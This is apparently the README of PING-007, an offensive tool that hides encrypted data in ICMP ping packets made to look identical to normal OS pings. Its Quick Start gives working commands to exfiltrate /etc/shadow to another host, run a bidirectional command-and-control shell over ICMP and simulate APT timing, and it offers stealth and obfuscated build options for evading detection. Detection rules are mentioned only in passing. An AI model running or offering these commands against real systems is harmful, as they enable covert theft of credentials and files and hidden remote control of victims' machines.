<div align="center">

<h1>PING-007</h1>
<p><em>Encrypted data inside packets byte-for-byte identical to a real OS ping.</em><br>
Covert ICMP framework — file exfiltration, C2 shell, APT timing profiles, OS signature mimicry.</p>

</div>

---

## About

PING-007 embeds encrypted payloads inside ICMP echo requests that are byte-for-byte identical to a real OS `ping` - same size, same TTL, same payload pattern, same timing. Unlike existing ICMP tools (icmpsh, ptunnel, Cobalt Strike's ICMP beacon), every packet conforms to the OS signature. Traffic is structurally indistinguishable from normal network diagnostics regardless of whether the observer has the key.

Supports file exfiltration, bidirectional C2 shell, configurable timing profiles, and OS signature mimicry (Linux 64B / Windows 40B).

> Full technical write-up, wire format analysis, APT comparison, and detection research: **[franckferman.github.io/ping-007](https://franckferman.github.io/ping-007)**

---

## Installation

Pre-compiled binaries for Linux, macOS, and Windows (amd64/arm64) are available on the [releases page](https://github.com/franckferman/ping-007/releases).

**Build from source:**

```bash
git clone https://github.com/franckferman/ping-007
cd ping-007
make build           # standard build → build/ping-007
make build-no-c2     # exfil + listener only, shell excluded
make build-stealth   # stripped, obfuscated, PIE
make build-ghost     # maximum stripping
make build-all       # all platforms (linux/darwin/windows, amd64/arm64)
```

Requirements: Go 1.25+, `CAP_NET_RAW` (Linux/macOS) or Administrator (Windows).

---

## Quick Start

```bash
# Exfiltrate a file
sudo ./build/ping-007 exfil -t 192.168.1.100 -f /etc/shadow -p "key" --mode fast

# Receive it
sudo ./build/ping-007 listen -o ./loot -p "key" --timeout 120

# Bidirectional C2 shell
sudo ./build/ping-007 listen -o /tmp/c2 -p "c2pass" --timeout 3600   # target
sudo ./build/ping-007 shell -t <TARGET_IP> -p "c2pass"                # operator

# APT timing simulation
sudo ./build/ping-007 apt -t 192.168.1.100 -r lazarus --duration 300 -p "key"
```

---

## Commands

```
ping-007 basic    - send a message (inline data, OS signature mimicry)
ping-007 exfil    - exfiltrate a file in encrypted chunks
ping-007 shell    - bidirectional C2 shell over ICMP
ping-007 listen   - receive and decrypt incoming data
ping-007 apt      - APT group timing simulation
ping-007 analyze  - passive network analysis
ping-007 status   - framework health check
```

---

## Documentation

- [DOCUMENTATION.md](DOCUMENTATION.md) - flag reference, wire format, steganography protocol, AES-256-GCM / ChaCha20-Poly1305 / XOR-CFB-HMAC crypto details, OPSEC layers, APT tool comparison (Pingback / PingPull / PING-007), Suricata/Zeek detection rules, build variants
- [franckferman.github.io/ping-007](https://franckferman.github.io/ping-007) - same content, rendered

---

## License

Licensed under the GNU Affero General Public License v3.0. See [LICENSE](LICENSE) for full terms.

---

## Contact

[![ProtonMail][protonmail-shield]](mailto:contact@franckferman.fr)
[![LinkedIn][linkedin-shield]](https://www.linkedin.com/in/franckferman)
[![Twitter][twitter-shield]](https://www.twitter.com/franckferman)

[protonmail-shield]: https://img.shields.io/badge/ProtonMail-8B89CC?style=for-the-badge&logo=protonmail&logoColor=blueviolet
[linkedin-shield]: https://img.shields.io/badge/-LinkedIn-black.svg?style=for-the-badge&logo=linkedin&colorB=blue
[twitter-shield]: https://img.shields.io/badge/-Twitter-black.svg?style=for-the-badge&logo=twitter&colorB=blue
